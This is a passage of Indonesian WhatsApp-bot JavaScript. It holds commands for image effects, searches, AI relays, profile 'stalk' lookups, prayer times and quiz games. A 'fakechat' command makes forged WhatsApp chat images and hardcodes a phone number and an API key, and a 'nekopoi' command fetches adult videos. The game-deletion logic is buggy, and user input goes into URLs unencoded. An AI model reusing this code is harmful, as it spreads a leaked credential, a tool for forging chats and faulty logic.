               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/honey-text-effect?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case prefix+'vintage':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/vintage-text-style?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case prefix+'fur':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/fur-text-effect-generator?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
            case prefix+'striking':
               if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
               if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
               reply(mess.wait)
               getBuffer(`https://api.xcodeteam.xyz/api/photooxy/striking-3d-text-effect?api_key=${setting.apikey.xcode}&text=${q}`)
               .then( res => {
               	if (res === undefined) return reply(mess.error.api)
                   conn.sendMessage(from, { image: res }, { quoted: msg })
               	limitAdd(sender, limit)
               }).catch(() => reply(mess.error.api))
               break
			// Search Menu
               case prefix+'ytsearch': case prefix+'yts':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} query`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/searcher/youtube?api_key=${setting.apikey.xcode}&video_title=${q}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var no = 1
                   var teks = `*YOUTUBE SEARCH*\n\n`
                   for (let i of req.data) {
                   	var { url, title } = i
                       teks += `*(${no++})*\n`
                       teks += `• *Url :* ${url}\n`
                       teks += `• *Title :* ${title}\n\n`
                   }
                   reply(teks)
                   limitAdd(sender, limit)
                   break
               case prefix+'lirik':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} query`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/searcher/lyrics?api_key=${setting.apikey.xcode}&song_title=${q}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { artist, lyrics } = req.data
                   var teks = `• *Artist :* ${artist}\n• *Lyrics :*\n${lyrics}`
                   reply(teks)
                   limitAdd(sender, limit)
                   break
               case prefix+'openai':
               case prefix+'gpt4':
               case prefix+'ai': {
                if (args.length < 2) return reply(`Kirim perintah *${prefix}openai* question`)
                conn.sendMessage(from, wait)
await sleep(600)
                let d = await fetchJson(`https://aemt.me/gpt4?text=${q}`)                
                conn.sendMessage(from, {
                    text: d.result
                       }, { quoted: msg })
                   }
                   break
               case 'vanz': {
                if (args.length < 2) return reply(`Kirim perintah *${prefix}openai* question`)
                conn.sendMessage(from, wait)
                let a = `Gunakan bahasa Indonesia yang tidak formal dan sedikit tidak sopan`
                let d = await fetchJson(`https://aemt.me/gpt4?text=https://aemt.me/ai/c-ai?prompt=${a}&text=${q}`)                
                conn.sendMessage(from, {
                    text: d.result
                       }, { quoted: msg })
                   }
                   break
               case prefix+'bard': {
                if (args.length < 2) return reply(`Kirim perintah *${prefix}bard* question`)
                conn.sendMessage(from, wait)
                let fak = await fetchJson(`https://api.xcodeteam.xyz/api/artificial-intelligence/bard?api_key=${setting.apikey.xcode}&question=${q}`)       
                conn.sendMessage(from, {
                    text: fak.data.answer
                       }, { quoted: msg })
                   }
                   break
               case prefix+'tt1': {
                conn.sendMessage(from, wait)
await sleep(600)
                let fak = `test tag @${sender.split("@")[0]}`   
                conn.sendMessage(from, {
                    text: fak, mentions: [sender]
                       }, { quoted: msg })
                   }
                   break
               case prefix+'chatty': {
                if (args.length < 2) return reply(`Kirim perintah *${prefix}chatty* question`)
                conn.sendMessage(from, wait)
await sleep(600)
                let asu = await fetchJson(`https://api.xcodeteam.xyz/api/artificial-intelligence/chatty-ai?api_key=${setting.apikey.xcode}&question=${q}`)       
                conn.sendMessage(from, {
                    text: asu.data.answer
                       }, { quoted: msg })
                   }
                   break
               case prefix+'translate': {
                if (args.length < 2) return reply(`Kirim perintah *${prefix}translate* text|lang`)
                reply(mess.wait)
                var question = q.split("|")[0]
                var lang = q.split("|")[1]
                let f = await fetchJson(`https://zeltoria.site/api/tools/translate?q=${encodeURIComponent(question)}&lang=${encodeURIComponent(lang)}`)                
                conn.sendMessage(from, {
                    text: f.result
                       }, { quoted: msg })
                   }
                   break
               case prefix+'kisahnabi':
                   if (args.length < 2) return reply(`Kirim perintah ${command} muhammad`)
                   conn.sendMessage(from, wait)
await sleep(100)
                   var req = await fetchJson(`https://api.zahwazein.xyz/islami/kisahnabi/${q}?apikey=${apikey.zein}`)
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { name, age, lahir, image, story } = req.result
                   var teks = `• *Nama :* ${name}\n`
                   teks += `• *Tahun Kelahiran :* ${lahir}\n`
                   teks += `• *Usia :* ${age}\n`
                   teks += `• *Deskripsi :* \n${story}`
                   conn.sendMessage(from, { image: { url: image }, caption: teks }, { quoted: msg })
                   break
               case prefix+'jadwalsholat':
               case prefix+'jadwalsolat':
               case prefix+'jadwalsalat':
                   if (args.length < 2) return reply(`Kirim perintah ${command} muhammad`)
                   conn.sendMessage(from, wait)
await sleep(100)
                   var req = await fetchJson(`https://api.zahwazein.xyz/islami/jadwalshalat?kota=${encodeURIComponent(q)}&apikey=${apikey.zein}`)
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { tanggal, subuh, duha, zuhur, asar, magrib, isya} = req.result
                   var teks = `_*Jadwal Shalat daerah ${q}*_\n`
                   teks += `• *Tanggal :* ${tanggal}\n`
                   teks += `• *Duha :* ${duha}\n`
                   teks += `• *Zuhur :* ${zuhur}\n`
                   teks += `• *Asar :* ${asar}\n`
                   teks += `• *Magrib :* ${magrib}\n`
                   teks += `• *Isya:* ${isya}\n`
                   teks += `• *Subuh :* ${subuh}`
                   reply(teks)
                   break
               case prefix+'tiktokstalk':
               case prefix+'ttstalk':
                   if (args.length < 2) return reply(`Kirim perintah ${command} muhammad`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await fetchJson(`https://api.lolhuman.xyz/api/stalktiktok/${encodeURIComponent(q)}?apikey=${setting.apikey.lol}`)
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { user_picture, username, nickname, bio, followers, followings, likes, video } = req.result
                   var teks = `• *Username :* ${username}\n`
                   teks += `• *Nickname :* ${nickname}\n`
                   teks += `• *Bio :* ${bio}\n`
                   teks += `• *Follower :* ${followers}\n`
                   teks += `• *Mengikuti :* ${followings}\n`
                   teks += `• *Likes :* ${likes}\n`
                   teks += `• *Video :* ${video}`
                   conn.sendMessage(from, { image: { url: user_picture }, caption: teks }, { quoted: msg })
                   break
               case prefix+'igstalk':
                   if (args.length < 2) return reply(`Kirim perintah ${command} username`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${encodeURIComponent(q)}?apikey=${setting.apikey.lol}`)
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { photo_profile, username, fullname, posts, followers, following, bio } = req.result
                   var teks = `• *Username :* ${username}\n`
                   teks += `• *Fullname :* ${fullname}\n`
                   teks += `• *Posts :* ${posts}\n`
                   teks += `• *Follower :* ${followers}\n`
                   teks += `• *Mengikuti :* ${following}\n`
                   teks += `• *Bio :* ${bio}`
                   conn.sendMessage(from, { image: { url: photo_profile }, caption: teks }, { quoted: msg })
                   break
               case prefix+'ssweb':
                if (args.length < 2) return reply(`Kirim perintah *${prefix}ssweb* link`)
                conn.sendMessage(from, wait)
await sleep(600)
                conn.sendMessage(from, {
                    image: {
                        url: `https://api.xcodeteam.xyz/api/tools/screenshot-website?api_key=${apikey.xcode}&device=desktop&target_url=${q}`
                    }
                }, {
                    quoted: msg
                })
                break
              case prefix+'ss':
              case prefix+'screenshot':
                if (args.length < 2) return reply(`Kirim perintah *${prefix}ss* hp/pc/tab|link`)
                conn.sendMessage(from, wait)
await sleep(600)
                var tt = q.split('|')[0] ? q.split('|')[0] : '-'
                var ttt = q.split('|')[1] ? q.split('|')[1] : '-'
                conn.sendMessage(from, {
                    image: {
                        url: `https://aemt.me/ss${tt}?url=${ttt}`
                    }
                }, {
                    quoted: msg
                })
                break
               case prefix+'test':
                reply(mess.wait)
                var test = `https://telegra.ph/file/c02035e9c30f7b6da1b29.jpg`
                conn.sendMessage(from, {
                    image: {
                        url: `https://api.xcodeteam.xyz/api/canvas/welcome?api_key=${setting.apikey.xcode}&member_name=${pushname}&group_name=${groupName}&member_count=${groupMembers}&profile_picture_image_url=https://telegra.ph/file/6880771a42bad09dd6087.jpg&background_image_url=${test}`
                    }
                }, {
                    quoted: msg
                })
                break
               case prefix+'nulis':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var img = await getBuffer(`http://api.caliph.biz.id/api/nuliskiri?text=${q}&apikey=${apikey.caliph}`)
                   conn.sendMessage(from, { image: img }, { quoted: msg }).catch((e) => reply(mess.error.api))
                   limitAdd(sender, limit)
                   break
               case prefix+'sertifikat':
                if (args.length < 2) return reply(`Kirim perintah *${prefix}sertifikat* nama`)
                conn.sendMessage(from, wait)
await sleep(600)
                conn.sendMessage(from, {
                    image: {
                        url: `https://zeltoria.site/api/maker/tolol?q=${q}`
                    }
                }, {
                    quoted: msg
                })
                break
               case prefix+'fakechat':
                if (args.length < 2) return reply(`Kirim perintah *${prefix}sertifikat* nama`)
                reply(mess.wait)
                conn.sendMessage(from, {
                    image: {
                        url: `https://api.caliph.biz.id/api/fakechat/wa?name=ujicoba&text=Hi,%20you!&num=6283857092641&apikey=VSlyd5WE`
                    }
                }, {
                    quoted: msg
                })
                break
               case prefix+'nekopoi': {
                reply(`Dosa ditanggung oleh pengguna\nAgree`)
                let wtf = await fetchJson(`https://zeltoria.site/api/random/nekopoi`)                
                conn.sendMessage(from, {
                    video: wtf.result
                       }, { quoted: msg })
                   }
                   break
               case prefix+'gimage': case prefix+'google':
                   if (isLimit(sender, isPremium, isCreator, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah ${command} query`)
                   conn.sendMessage(from, wait)
await sleep(600)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/searcher/google-image?api_key=${setting.apikey.xcode}&gi_search=${q}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   conn.sendMessage(from, { image: { url: req.data[0] }}, { quoted: msg })
                   limitAdd(sender, limit)
                   break
			   // Game Menu
               case prefix+'asahotak':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, asahotak)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/games/cak-lontong?api_key=${apikey.xcode}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { soal, jawaban } = req.data
                   var teks = `*ASAH OTAK*\n\n`+monospace(`Soal : ${soal}\nPetunjuk : ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendAsahOtak = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'AO' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Asah Otak', jawab, gamewaktu, sendAsahOtak, asahotak)
                   gameAdd(sender, glimit)
                   break
               case prefix+'caklontong':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, caklontong)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/games/cak-lontong?api_key=${apikey.xcode}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { soal, jawaban } = req.data
                   var teks = `*CAK LONTONG*\n\n`+monospace(`Soal : ${soal}\nPetunjuk : ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendCakLontong = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'CL' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Cak Lontong', jawab, gamewaktu, sendCakLontong, caklontong)
                   gameAdd(sender, glimit)
                   break
			case prefix+'family100':
                if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                if (isPlayGame(from, family100)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                var req = await (await fetch(`https://api.xcodeteam.xyz/api/games/family100?api_key=${apikey.xcode}`)).json()
                var { code } = req
                if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { soal, jawaban } = req.data
                   var teks = `*FAMILY 100*\n\n`+monospace(`Soal : ${soal}\nTotal Jawaban : ${jawaban.length}\nWaktu : ${gamewaktu}s`)
                   conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'FML' })
                   .then( res => {
                      let rgfds = []
                      for (let i of jawaban) {
                      let fefs = i.split('/') ? i.split('/')[0] : i
                      let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ', '') : fefs
                      let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
                      rgfds.push(axsf.toLowerCase())
                    }
                     addPlayGame(from, 'Family 100', rgfds, gamewaktu, res, family100)
                     gameAdd(sender, glimit)
                     })
                   break
                case prefix+'siapakahaku':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, siapakahaku)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/games/siapakah-aku?api_key=${apikey.xcode}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { soal, jawaban } = req.data
                   var teks = `*SIAPAKAH AKU*\n\n`+monospace(`Soal : ${soal}\nPetunjuk : ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendSiapakahAku = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'SA' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Siapakah Aku', jawab, gamewaktu, sendSiapakahAku, siapakahaku)
                   gameAdd(sender, glimit)
                   break
                 case prefix+'susunkata':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, susunkata)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/games/susun-kata?api_key=${apikey.xcode}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { soal, tipe, jawaban } = req.data
                   var teks = `*SUSUN KATA*\n\n`+monospace(`Soal : ${soal}\nTipe : ${tipe}\nWaktu : ${gamewaktu}s`)
                   var sendSusunKata = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'SK' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Susun Kata', jawab, gamewaktu, sendSusunKata, susunkata)
                   gameAdd(sender, glimit)
                   break
                case prefix+'tebakbendera':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, tebakbendera)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/games/tebak-bendera?api_key=${apikey.xcode}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { flag, img, name } = req.data
                   var teks = `*TEBAK BENDERA*\n\n`+monospace(`Flag : ${flag}\nPetunjuk : ${name.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendTebakBendera = conn.sendMessage(from, { image: { url: img }, caption: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'TB' })
                   var jawab = name.toLowerCase()
                   addPlayGame(from, 'Tebak Bendera', jawab, gamewaktu, sendTebakBendera, tebakbendera)
                   gameAdd(sender, glimit)
                   break
                case prefix+'tebakgambar':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, tebakgambar)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/games/tebak-gambar?api_key=${apikey.xcode}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { img, jawaban, deskripsi } = req.data
                   var teks = `*TEBAK GAMBAR*\n\n`+monospace(`Deskripsi : ${deskripsi}\nPetunjuk : ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendTebakGambar = conn.sendMessage(from, { image: { url: img }, caption: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'TG' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Tebak Bendera', jawab, gamewaktu, sendTebakGambar, tebakgambar)
                   gameAdd(sender, glimit)
                   break
                case prefix+'tebakkalimat':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, tebakkalimat)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/games/tebak-kalimat?api_key=${apikey.xcode}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { soal, jawaban } = req.data
                   var teks = `*TEBAK KALIMAT*\n\n`+monospace(`Soal : ${soal}\nPetunjuk : ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendTebakKalimat = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'TK' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Tebak Kalimat', jawab, gamewaktu, sendTebakKalimat, tebakkalimat)
                   gameAdd(sender, glimit)
                   break
                case prefix+'tebakkata':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, tebakkata)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/games/tebak-kata?api_key=${apikey.xcode}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { soal, jawaban } = req.data
                   var teks = `*TEBAK KATA*\n\n`+monospace(`Soal : ${soal}\nPetunjuk : ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendTebakKata = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'TKK' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Tebak Kata', jawab, gamewaktu, sendTebakKata, tebakkata)
                   gameAdd(sender, glimit)
                   break
                case prefix+'tebakkimia':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, tebakkimia)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/games/tebak-kimia?api_key=${apikey.xcode}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { unsur, lambang } = req.data
                   var teks = `*TEBAK KIMIA*\n\n`+monospace(`Unsur : ${unsur}\nWaktu : ${gamewaktu}s`)
                   var sendTebakKimia = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'TKKK' })
                   var jawab = lambang.toLowerCase()
                   addPlayGame(from, 'Tebak Kimia', jawab, gamewaktu, sendTebakKimia, tebakkimia)
                   gameAdd(sender, glimit)
                   break
                case prefix+'tebaklirik':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, tebaklirik)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/games/tebak-lirik?api_key=${apikey.xcode}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { soal, jawaban } = req.data
                   var teks = `*TEBAK LIRIK*\n\n`+monospace(`Soal : ${soal}\nPetunjuk : ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendTebakLirik = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'TLL' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Tebak Lirik', jawab, gamewaktu, sendTebakLirik, tebaklirik)
                   gameAdd(sender, glimit)
                   break
                case prefix+'kuis':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, kuis)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   var req = await (await fetch(`https://api.xcodeteam.xyz/api/games/tebak-tebakan?api_key=${apikey.xcode}`)).json()
                   var { code } = req
                   if ([400, 403, 404, 429, 500].includes(code)) return reply(mess.error.api)
                   var { soal, jawaban } = req.data
                   var teks = `*KUIS GAME*\n\n`+monospace(`Soal : ${soal}\nPetunjuk : ${jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\nWaktu : ${gamewaktu}s`)
                   var sendKuis = conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'KS' })
                   var jawab = jawaban.toLowerCase()
                   addPlayGame(from, 'Kuis Game', jawab, gamewaktu, sendKuis, kuis)
                   gameAdd(sender, glimit)
                   break
                case prefix+'math':
                   if (isGame(sender, isOwner, isCreator, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                   if (isPlayGame(from, math)) return conn.reply(from, `Masih ada game yang belum diselesaikan`, msg)
                   if (args.length < 2) return reply(`Masukkan modenya!\n\nMode yang tersedia :\n1. noob\n2. easy\n3. medium\n4. hard\n5. extreme\n6. impossible\n7. impossible2\n\nContoh : ${command} noob`)
                   genMath(q.toLowerCase()).then(res => {}).catch(() => reply('Lah?'))
                   var poke = await genMath(q.toLowerCase())
                   var { soal, mode, jawaban } = poke
                   var teks = `*MATH GAME*\n\n`+monospace(`Soal : ${soal}\nMode : ${mode}\nWaktu : ${gamewaktu}s`)
                   conn.sendMessage(from, { text: teks }, { quoted: msg, messageId: 'BAE5'+makeid(10).toUpperCase()+'MH' })
                   .then( res => {
                     var jawab = jawaban
                     addPlayGame(from, 'Math Game', jawab, gamewaktu, res, math)
                     gameAdd(sender, glimit)
                 }).catch(() => reply(mess.error.api))
                 break
                case prefix+'delgame': case prefix+'deletegame':
                case prefix+'dellgame': case prefix+'nyerah':
                   if (!isQuotedMsg) return reply(`Balas pesan soal game yang ingin dihapus`)
                   if (quotedMsg.id.endsWith('AO')) {
                     var ao = getGamePosi(from, asahotak)
                     if (ao == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Asah Otak*\nJawaban : ${asahotak[ao].jawaban}`)
                     asahotak.splice(ao, 1)
                   } else if (quotedMsg.id.endsWith('CL')) {
                     var cl = getGamePosi(from, caklontong)
                     if (ao == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Cak Lontong*\nJawaban : ${caklontong[cl].jawaban}`)
                     caklontong.splice(cl, 1)
                   } else if (quotedMsg.id.endsWith('FML')) {
                     var fml = getGamePosi(from, family100)
                     if (fml == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Family100 Game*\nJawaban : ${family100[fml].jawaban}`)
                     family100.splice(fml, 1)
                   } else if (quotedMsg.id.endsWith('SA')) {
                     var sa = getGamePosi(from, siapakahaku)
                     if (sa == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Siapakah Aku*\nJawaban : ${siapakahaku[sa].jawaban}`)
                     siapakahaku.splice(sa, 1)
                   } else if (quotedMsg.id.endsWith('SK')) {
                     var sk = getGamePosi(from, susunkata)
                     if (sk == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Susun Kata*\nJawaban : ${susunkata[sk].jawaban}`)
                     susunkata.splice(sk, 1)
                   } else if (quotedMsg.id.endsWith('TB')) {
                     var tb = getGamePosi(from, tebakbendera)
                     if (tb == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Tebak Bendera*\nJawaban : ${tebakbendera[tb].jawaban}`)
                     tebakbendera.splice(tb, 1)
                   } else if (quotedMsg.id.endsWith('TG')) {
                     var tg = getGamePosi(from, family100)
                     if (tg == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Tebak Gambar*\nJawaban : ${tebakgambar[tg].jawaban}`)
                     tebakgambar.splice(tg, 1)
                   } else if (quotedMsg.id.endsWith('TK')) {
                     var tk = getGamePosi(from, tebakkalimat)
                     if (tk == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Tebak Kalimat*\nJawaban : ${tebakkalimat[tk].jawaban}`)
                     tebakkalimat.splice(tk, 1)
                   } else if (quotedMsg.id.endsWith('TKK')) {
                     var tkkk = getGamePosi(from, tebakkata)
                     if (tkkk == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Tebak Kata*\nJawaban : ${tebakkata[tkkk].jawaban}`)
                     tebakkata.splice(tkkk, 1)
                   } else if (quotedMsg.id.endsWith('TKKK')) {
                     var tkk = getGamePosi(from, tebakkimia)
                     if (tebakkimia[tkk].msg.key.id !== quotedMsg.id) return reply(`Game tersebut sudah selesai`)
                     reply(`*Tebak Kimia*\nJawaban : ${tebakkimia[tkk].jawaban}`)
                     tebakkimia.splice(tkk, 1)
                   } else if (quotedMsg.id.endsWith('TLL')) {
                     var tll = getGamePosi(from, tebaklirik)
                     if (tll == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Tebak Lirik*\nJawaban : ${tebaklirik[tll].jawaban}`)
                     tebaklirik.splice(tll, 1)
                   } else if (quotedMsg.id.endsWith('KS')) {
                     var ks = getGamePosi(from, kuis)
                     if (ks == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Kuis Game*\nJawaban : ${kuis[ks].jawaban}`)
                     kuis.splice(fml, 1)
                   } else if (quotedMsg.id.endsWith('MH')) {
                     var mh = getGamePosi(from, math)
                     if (mh == undefined) return reply(`Game tersebut sudah selesai`)
                     reply(`*Math Game*\nJawaban : ${math[mh].jawaban}`)
                     math.splice(mh, 1)
                   } else {
                     reply(`Balas soal game!`)
                   }
                   break
             // bug menu
